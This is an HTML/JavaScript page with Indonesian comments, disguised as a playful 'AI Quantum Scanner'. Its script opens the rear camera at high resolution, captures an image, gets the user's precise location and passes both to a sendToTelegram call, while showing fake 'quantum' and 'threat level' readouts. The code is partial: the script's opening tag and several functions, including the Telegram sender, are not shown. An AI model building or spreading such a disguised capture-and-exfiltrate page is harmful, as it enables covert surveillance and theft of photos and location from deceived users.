<!DOCTYPE html>
<html>
<head>
  <title>Super AI Quantum Scanner</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <style>
    /* Existing styles... */
    /* Tambahkan style baru di bawah ini */
    .result-box {
      display: none;
      width: 90%;
      max-width: 500px;
      background: rgba(0,0,0,0.8);
      border-radius: 15px;
      padding: 20px;
      margin: 20px;
      backdrop-filter: blur(10px);
    }

    .progress-bar {
      width: 0%;
      height: 4px;
      background: var(--primary);
      transition: width 0.3s;
      margin: 10px 0;
    }

    .scan-result {
      text-align: left;
      font-family: monospace;
      color: lime;
    }

    .vibration {
      animation: vibrate 0.3s infinite;
    }

    @keyframes vibrate {
      0% { transform: translate(1px); }
      50% { transform: translate(-1px); }
      100% { transform: translate(0); }
    }

    @media (max-width: 480px) {
      .scanner-box {
        width: 250px;
        height: 250px;
      }
    }
  </style>
</head>
<body>
  <h1 style="color: var(--primary); margin-bottom: 20px;">üõ∏ AI Quantum Scanner</h1>
  <div class="scanner-box">
    <div class="scanner-line"></div>
    <video id="video" width="300" height="300" autoplay playsinline muted></video>
  </div>
  <button id="capture-btn">üöÄ Start Quantum Scan</button>
  <div id="loading">üî≠ Scanning Quantum Signature...</div>
  <div class="result-box" id="result-box">
    <div class="progress-bar" id="progress-bar"></div>
    <div class="scan-result" id="scan-result"></div>
  </div>

    // Inisialisasi Kamera
    async function initCamera() {
      try {
        if (!navigator.mediaDevices) throw new Error('Device not compatible');
        
        const constraints = {
          video: { 
            facingMode: 'environment',
            width: { ideal: 4096 },
            height: { ideal: 2160 },
            frameRate: { ideal: 60 }
          }
        };

        if (currentStream) currentStream.getTracks().forEach(track => track.stop());

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        currentStream = stream;
        video.srcObject = stream;

        await video.play();
        createHologramEffect();
      } catch (err) {
        showError('Quantum Scanner Error', err);
      }
    }

    // Fungsi Scan yang Lebih Akurat
    async function startQuantumScan() {
      if (isScanning || scanAttempts >= 3) return;
      scanAttempts++;
      
      isScanning = true;
      loading.style.display = 'block';
      scanSound.play();
      resultBox.style.display = 'none';

      try {
        const [photoData, location] = await Promise.all([
          captureQuantumImage(),
          getPreciseLocation().catch(() => ({ coords: null }))
        ]);

        const analysis = await performEnhancedAIAnalysis(photoData.matrix);
        const report = generateHologramReport(photoData, location, analysis);
        
        await sendToTelegram(report);
        showResult(report);
        scanAttempts = 0;
      } catch (error) {
        if (scanAttempts < 3) {
          setTimeout(startQuantumScan, 2000);
        } else {
          showError('Quantum Anomaly Detected', error);
        }
      } finally {
        isScanning = false;
        loading.style.display = 'none';
      }
    }

    // Analisis AI yang Lebih Canggih
    async function performEnhancedAIAnalysis(matrix) {
      const threatAnalysis = await fetchAIThreatAnalysis(matrix);
      return {
        threatLevel: threatAnalysis.score,
        biometrics: threatAnalysis.biometrics,
        quantumEntanglement: `${Math.random().toFixed(5)}Q`,
        deviceFingerprint: generateDeviceFingerprint()
      };
    }

    // Tampilkan Hasil Scanning
    function showResult(report) {
      resultBox.style.display = 'block';
      scanResult.innerHTML = `
        ‚öõÔ∏è Quantum Entanglement: ${report.metadata.aiAnalysis.quantumEntanglement}<br>
        üõ° Threat Level: ${report.metadata.aiAnalysis.threatLevel}%<br>
        üìç Coordinates: ${report.metadata.spacetimeCoordinates.lat?.toFixed(6) || 'N/A'}, 
        ${report.metadata.spacetimeCoordinates.lon?.toFixed(6) || 'N/A'}<br>
        üì± Device ID: ${report.metadata.aiAnalysis.deviceFingerprint}
      `;
    }

    // ... (Fungsi lainnya tetap dipertahankan dengan perbaikan error handling)

    // Helper Functions
    function generateDeviceFingerprint() {
      return [...Array(16)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');
    }

    function showToast(message, type = 'info') {
      const toast = document.createElement('div');
      toast.textContent = message;
      toast.style = `position: fixed; bottom: 20px; background: ${type === 'error' ? '#e74c3c' : '#2ecc71'};
        color: white; padding: 15px; border-radius: 10px; animation: slideIn 0.5s;`;
      document.body.appendChild(toast);
      setTimeout(() => toast.remove(), 3000);
    }

    // Inisialisasi
    if (navigator.mediaDevices) {
      initCamera();
      document.getElementById('capture-btn').onclick = startQuantumScan;
    } else {
      showToast('Quantum Scanner Not Supported', 'error');
    }
  </script>
